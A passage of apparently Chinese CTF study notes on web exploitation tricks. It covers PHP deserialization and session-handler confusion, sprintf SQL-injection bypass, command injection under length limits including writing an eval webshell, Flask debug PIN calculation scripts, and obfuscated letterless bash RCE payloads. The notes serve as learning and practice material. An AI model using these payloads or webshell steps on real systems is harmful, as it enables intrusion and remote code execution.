<td><code>PDO</code></td>
<td>PHP 核心</td>
<td>✅ 是</td>
<td>某些子类有 <code>__call</code>（如通过驱动动态方法绑定）</td>
</tr>
<tr>
<td><code>DirectoryIterator</code></td>
<td>SPL</td>
<td>✅ 是</td>
<td>间接触发可能存在于迭代器组合中</td>
</tr>
<tr>
<td><code>MongoDB\Driver\Manager</code></td>
<td>MongoDB 扩展</td>
<td>✅ 是</td>
<td>某些调用未定义方法可触发 __call</td>
</tr>
</tbody>
</table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">查询原生类的方法;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"><span class="variable">$magicMethods</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="comment">// &#x27;__destruct&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__toString&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__wakeup&#x27;,</span></span><br><span class="line">    <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">    <span class="comment">// &#x27;__callStatic&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__get&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__set&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__isset&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__unset&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__invoke&#x27;,</span></span><br><span class="line">    <span class="comment">// &#x27;__set_state&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$magicMethods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$class</span>, <span class="variable">$method</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="4字符串溢出"><a class="markdownIt-Anchor" href="#4字符串溢出"></a> 4.字符串溢出:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">在反序列化之后&#125;<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;，如果能做到这样，那么在第一个&#125;之后的数据会忽视</span></span><br></pre></td></tr></table></figure>
<h2 id="5session反序列化漏洞"><a class="markdownIt-Anchor" href="#5session反序列化漏洞"></a> 5.session反序列化漏洞：</h2>
<h3 id="1php处理器"><a class="markdownIt-Anchor" href="#1php处理器"></a> 1.php处理器:</h3>
<p>session.serialize_handler的引擎有看下面。<br />
注：php_serialize是从5.5.4开始使用的。</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>处理器名称</strong></th>
<th style="text-align:left"><strong>存储格式</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><strong>php</strong></td>
<td style="text-align:left"><strong>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</strong></td>
</tr>
<tr>
<td style="text-align:left"><strong>php_binary</strong></td>
<td style="text-align:left"><strong>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</strong></td>
</tr>
<tr>
<td style="text-align:left"><strong>php_serialize</strong></td>
<td style="text-align:left"><strong>经过serialize()函数序列化处理的数组</strong>  php_serialize在内部简单地直接使用 serialize/unserialize函数</td>
</tr>
</tbody>
</table>
<p>php_serialize处理器是进行了一次php序列化，但是我们传入了一个|，在php处理器的理解是</p>
<blockquote>
<p>这三部分</p>
<p>a:1:{s:7:“session”;s:37:&quot; //键名，这个是不解析的</p>
<p>| //分隔符</p>
<p>O:1:“A”:1:{s:1:“a”;s:9:“phpinfo()”;} //键值</p>
</blockquote>
<h3 id="2session_start默认开启"><a class="markdownIt-Anchor" href="#2session_start默认开启"></a> 2.session_start默认开启:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>()，这里php的版本是<span class="number">7.3</span>.<span class="number">11</span>，所以就是默认就是<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="6php地址引用"><a class="markdownIt-Anchor" href="#6php地址引用"></a> 6.php地址引用:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如果需要一个值等于另一个的地址   ---&amp;$   ---&amp;取地址</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>渗透学习</category>
        <category>ctfshow</category>
      </categories>
  </entry>
  <entry>
    <title>常用姿势</title>
    <url>/2025/10/12/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="php"><a class="markdownIt-Anchor" href="#php"></a> php</h1>
<h2 id="1sprintf函数"><a class="markdownIt-Anchor" href="#1sprintf函数"></a> 1.sprintf函数:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">作用是将格式化字符串写入变量中</span><br><span class="line">函数形式为<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">不带占位符:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;  </span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>); </span><br><span class="line"><span class="comment">/* %\会被认为是占位符类似%s，但是admin没有匹配，结果会变为select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">有占位符:  %<span class="number">1</span>$\  是一样的道理%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
<hr />
<hr />
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//addslashes()函数：在预定义前面加反斜杠，预定义符有单引号（&#x27;），双引号（&quot;），反斜杠（\），NULL</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> 当传入pass= %<span class="number">1</span>$<span class="string">&#x27; and 1=1 #     </span></span><br><span class="line"><span class="string">    得到 and pass=&#x27;</span>%<span class="number">1</span>$\<span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">      之后第三步 select * <span class="keyword">from</span> user where name=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> pass=<span class="string">&#x27;%1$\&#x27; and 1=1 #&#x27;</span>   但是%<span class="number">1</span>$\会消失</span><br></pre></td></tr></table></figure>
<h2 id="2mb_strpos和mb_substr函数"><a class="markdownIt-Anchor" href="#2mb_strpos和mb_substr函数"></a> 2.mb_strpos和mb_substr函数:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">当以 \xF0 开头的字节序列出现在 UTF-<span class="number">8</span> 编码中时，通常表示一个四字节的 Unicode 字符。这是因为 UTF-<span class="number">8</span> 编码规范定义了以 \xF0 开头的字节序列用于编码较大的 Unicode 字符。</span><br></pre></td></tr></table></figure>
<h3 id="21mb_strpos函数"><a class="markdownIt-Anchor" href="#21mb_strpos函数"></a> 2.1mb_strpos函数:</h3>
<p>mb_strpos — 查找字符串在另一个字符串中首次出现的位置</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_strpos</span>(<span class="string">&quot;\xF0\x9EAAA&lt;BB&quot;</span>, <span class="string">&#x27;&lt;&#x27;</span>)     --返回<span class="number">4</span></span><br><span class="line">                                在不满足<span class="number">4</span>字节时: 会把\xF0\x9E当作两个字节</span><br></pre></td></tr></table></figure>
<h3 id="22mb_substr函数"><a class="markdownIt-Anchor" href="#22mb_substr函数"></a> 2.2mb_substr函数:</h3>
<p>mb_substr — 获取部分字符串(按字符来取:utf-8四字节)</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">mb_substr</span>(<span class="string">&quot;\xf0\x9eAAA&lt;BB&quot;</span>, <span class="number">0</span>, <span class="number">4</span>)     ---从第<span class="number">0</span>字节开始截取，到第<span class="number">4</span>位字节</span><br><span class="line">                                 在不满足<span class="number">4</span>字节时: 会把\xF0\x9EAA当作一个字符</span><br></pre></td></tr></table></figure>
<h3 id="结论"><a class="markdownIt-Anchor" href="#结论"></a> 结论:</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节</span><br><span class="line">一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节</span><br><span class="line">一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</span><br></pre></td></tr></table></figure>
<h2 id="3filter_validate_ip函数"><a class="markdownIt-Anchor" href="#3filter_validate_ip函数"></a> 3.FILTER_VALIDATE_IP函数:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">对这个函数来说:<span class="title function_ invoke__">filter_var</span> (<span class="variable">$ip</span>,FILTER_VALIDATE_IP)</span><br><span class="line">    <span class="variable">$ip</span>=cdef::<span class="variable constant_">abce</span>      ---  会被解析成ipv6地址,但是只能为 a-f 表示<span class="number">16</span>进制，而且最多为<span class="number">4</span>位</span><br></pre></td></tr></table></figure>
<h2 id="4filter_validate_email函数"><a class="markdownIt-Anchor" href="#4filter_validate_email函数"></a> 4.FILTER_VALIDATE_EMAIL函数:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">这个函数要求所有的特殊字符都需要被<span class="string">&quot;&quot;</span>包括</span><br></pre></td></tr></table></figure>
<h2 id="5命令注入长度限制绕过"><a class="markdownIt-Anchor" href="#5命令注入长度限制绕过"></a> 5.命令注入长度限制绕过:</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`  `   ---反引号执行命令;</span><br><span class="line">nl   ---查看文件</span><br></pre></td></tr></table></figure>
<h3 id="115位可控字符下的任意命令执行"><a class="markdownIt-Anchor" href="#115位可控字符下的任意命令执行"></a> 1.15位可控字符下的任意命令执行:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如需执行 <span class="keyword">echo</span> \<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);?\&gt;&gt;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> \<span class="meta">&lt;?php</span> &gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">eval</span>\(&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \<span class="variable">$_GET</span>&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \[<span class="number">1</span>\]&gt;&gt;<span class="number">1</span></span><br><span class="line"><span class="keyword">echo</span> \)\;<span class="meta">?&gt;</span>&gt;<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h3 id="27-5位可控字符下的任意命令执行"><a class="markdownIt-Anchor" href="#27-5位可控字符下的任意命令执行"></a> 2.7-5位可控字符下的任意命令执行:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ls&gt;c会将目录下面的文件名写入到c文件中；ls -t&gt;<span class="number">0</span>会将文件名按照创建的时间倒叙写入<span class="number">0</span>文件中。并且自动换行。</span><br><span class="line">\作为转义符，转义之后的<span class="string">&#x27;\&#x27;是用来换行分隔，也就是换行也是连接的。</span></span><br><span class="line"><span class="string">执行这个命令:</span></span><br><span class="line"><span class="string">	echo PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4= | base64 -d &gt;1.php</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	w&gt;hp</span></span><br><span class="line"><span class="string">	w&gt;\.p\\     --第一个\转义.第二个\转义\</span></span><br><span class="line"><span class="string">倒叙新建文件名，然后通过ls -t&gt;0，将刚才的顺序再倒序然后写入到0文件中，然后用sh将0当作脚本执行。</span></span><br><span class="line"><span class="string">	可以把ls -t&gt;0继续分端存入文件      ---最低5位 &gt;\ \\这个就需要5位了</span></span><br></pre></td></tr></table></figure>
<h3 id="34位命令执行"><a class="markdownIt-Anchor" href="#34位命令执行"></a> 3.4位命令执行:</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;sl</span><br><span class="line">&gt;l\-</span><br><span class="line">&gt;dir     现在*就是dir</span><br><span class="line">*&gt;v</span><br><span class="line">&gt;rev</span><br><span class="line">*v&gt;<span class="number">0</span></span><br><span class="line">sh <span class="number">0</span></span><br></pre></td></tr></table></figure>
<h1 id="python"><a class="markdownIt-Anchor" href="#python"></a> python:</h1>
<h2 id="1执行函数"><a class="markdownIt-Anchor" href="#1执行函数"></a> 1.执行函数 :</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>方法</th>
<th>示例代码（精简）</th>
<th>返回值 / 行为</th>
<th>优点 / 场景</th>
<th>风险 / 绕过点</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>os.system</code></td>
<td><code>os.system(&quot;ls -la&quot;)</code></td>
<td>返回退出码，只把输出写到 stdout</td>
<td>简单、常见</td>
<td>无输出捕获，不适合读取结果</td>
</tr>
<tr>
<td><code>os.popen</code></td>
<td><code>os.popen(&quot;cat /etc/passwd&quot;).read()</code></td>
<td>返回字符串输出</td>
<td>易用于拿回显（CTF 常用）</td>
<td>受限环境可被禁用</td>
</tr>
<tr>
<td><code>subprocess.run</code></td>
<td><code>subprocess.run([&quot;ls&quot;,&quot;-la&quot;])</code></td>
<td><code>CompletedProcess</code>，可设置 <code>capture_output=True</code></td>
<td>推荐标准方式，参数化、安全</td>
<td><code>shell=True</code> 则有注入风险</td>
</tr>
<tr>
<td><code>subprocess.check_output</code></td>
<td><code>subprocess.check_output(&quot;whoami&quot;, shell=True)</code></td>
<td>返回 bytes（命令输出）</td>
<td>直接拿到输出</td>
<td><code>shell=True</code> 有注入风险</td>
</tr>
<tr>
<td><code>os.exec*</code> 系列</td>
<td><code>os.execl(&quot;/bin/sh&quot;,&quot;sh&quot;)</code></td>
<td>替换当前进程，不回到 Python</td>
<td>做后门 / 逃逸进程时用</td>
<td>会终止原 Python 程序</td>
</tr>
<tr>
<td>动态导入（绕过限制）</td>
<td><code>__import__('os').popen('id').read()</code></td>
<td>同 <code>os.popen</code></td>
<td>当 <code>os</code> 被删除或屏蔽时可用</td>
<td>常见绕过手段</td>
</tr>
<tr>
<td><code>ctypes</code> / syscall</td>
<td><code>ctypes.CDLL(None).system(b&quot;ls&quot;)</code></td>
<td>调用 libc 的 system</td>
<td>当内置模块受限时尝试</td>
<td>复杂，平台相关</td>
</tr>
<tr>
<td>反弹/互动 shell (实验室)</td>
<td><code>python -c '...'</code></td>
<td>获取交互 shell / 反弹</td>
<td>用于拿交互式控制</td>
<td>高风险，仅限授权环境</td>
</tr>
</tbody>
</table>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;&#x27;</span>).read()    ---用这个能读文件</span><br></pre></td></tr></table></figure>
<h1 id="flask算pin"><a class="markdownIt-Anchor" href="#flask算pin"></a> flask算pin:</h1>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">pin码是flask在开启debug模式下，进行代码调试模式所需的进入密码，需要正确的PIN码才能进入调试模式 ----报错即可进入</span><br></pre></td></tr></table></figure>
<h2 id="1pin码的生成"><a class="markdownIt-Anchor" href="#1pin码的生成"></a> 1.pin码的生成:</h2>
<ul>
<li>1.username 在可以任意文件读的条件下读 /etc/passwd进行猜测</li>
<li>2.modname 默认flask.app</li>
<li>3.appname 默认Flask</li>
<li>4.moddir flask库下app.py的绝对路径,可以通过报错拿到,如传参的时候给个不存在的变量</li>
<li>5.uuidnode mac地址的十进制,任意文件读 /sys/class/net/eth0/address得到16进制结果，转化为10进制进行计算</li>
<li>6.machine_id 机器码,由三个合并(docker就后两个)：1./etc/machine-id(docker无) 2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup(也可以把self换成pid)</li>
</ul>
<h2 id="2python36md5"><a class="markdownIt-Anchor" href="#2python36md5"></a> 2.python3.6(md5):</h2>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#MD5</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">     <span class="string">&#x27;flaskweb&#x27;</span></span><br><span class="line">     <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>    <span class="comment"># moddir</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">     <span class="string">&#x27;25214234362297&#x27;</span>,    <span class="comment"># uuidnode mac地址</span></span><br><span class="line">     <span class="string">&#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;</span>    <span class="comment">#machine_id 机器码</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">   num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">   <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">          rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                      <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">          rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<h2 id="3python38sha1"><a class="markdownIt-Anchor" href="#3python38sha1"></a> 3.python3.8(sha1):</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sha1</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>    <span class="comment"># moddir</span></span><br><span class="line">]</span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377581187&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce55d22089f5fa429839d25dcea4675fb930c111da3bb774a6ab7349428589aefd&#x27;</span></span><br><span class="line">]</span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<h1 id="无字母无数字rcelinxu"><a class="markdownIt-Anchor" href="#无字母无数字rcelinxu"></a> 无字母无数字rce(linxu):</h1>
<h2 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">变量名	含义</span><br><span class="line">$0	脚本本身的名字   ---bash</span><br><span class="line">$1	脚本后所输入的第一串字符</span><br><span class="line">$2	传递给该shell脚本的第二个参数</span><br><span class="line">$*	脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</span><br><span class="line">$@	脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’</span><br><span class="line">$_	表示上一个命令的最后一个参数</span><br><span class="line">$#	#脚本后所输入的字符串个数</span><br><span class="line">$$	脚本运行的当前进程ID号</span><br><span class="line">$!	表示最后执行的后台命令的PID</span><br><span class="line">$?	显示最后命令的退出状态，0表示没有错误，其他表示由错误</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在 Bash 的算术扩展语法 $(( ... )) 中，</span><br><span class="line">数字字面量可以使用如下格式：</span><br><span class="line">base#number    --base是基数  进制转换</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">位移运算的基本概念：</span><br><span class="line">左移运算符 &lt;&lt; 是 位移运算符，表示将一个数字的二进制位向左移动指定的位数。</span><br><span class="line">每左移一位，相当于该数字乘以 2。</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;&lt;&lt; 是 Bash 中的 Here String 操作符，用于将一个字符串作为标准输入传递给一个命令。</span><br><span class="line">    语法：</span><br><span class="line">    command &lt;&lt;&lt; &quot;$word&quot;</span><br><span class="line">bash&lt;&lt;&lt;$&#x27;ls&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$#这个变量，它可以表示#脚本后所输入的字符串个数：</span><br><span class="line">		1用$&#123;##&#125;替换，0用$&#123;#&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感叹号 ! 有许多不同的用法，特别是在 Bash 中，其中之一是用于 变量替换，也称作 历史扩展。</span><br></pre></td></tr></table></figure>
<h2 id="1无字母时"><a class="markdownIt-Anchor" href="#1无字母时"></a> 1.无字母时:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在linux可以完美可以利用八进制的方法绕过一些ban了字母的题 ，即可以使用$&#x27;\xxx&#x27;的方式执行命令</span><br><span class="line">$&#x27;\154\163&#x27;   --执行ls</span><br></pre></td></tr></table></figure>
<h2 id="2使用0-1"><a class="markdownIt-Anchor" href="#2使用0-1"></a> 2.使用0-1:</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$0&lt;&lt;&lt;$\&#x27;\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10100011))\&#x27;   </span><br><span class="line">              ---执行ls ,但是无法执行带空格的命令</span><br><span class="line">$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($((1&lt;&lt;1))#10001111))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10100100))\\$(($((1&lt;&lt;1))#101000))\\$(($((1&lt;&lt;1))#10010010))\\$(($((1&lt;&lt;1))#10011010))\\$(($((1&lt;&lt;1))#10001101))\\$(($((1&lt;&lt;1))#10010011))\&#x27;</span><br><span class="line">              ---执行 cat flag   通过两次$0&lt;&lt;&lt;得到</span><br><span class="line">把上面payload使用1用$&#123;##&#125;替换，0用$&#123;#&#125;替换(不能替换$0)得到:</span><br><span class="line">$0&lt;&lt;&lt;$0\&lt;\&lt;\&lt;\$\&#x27;\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;$&#123;#&#125;$&#123;##&#125;))\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;#&#125;$&#123;#&#125;$&#123;##&#125;$&#123;##&#125;))\&#x27;</span><br><span class="line">             ---执行 cat flag 没用1</span><br></pre></td></tr></table></figure>
<h2 id="3无数字字母"><a class="markdownIt-Anchor" href="#3无数字字母"></a> 3.无数字字母:</h2>
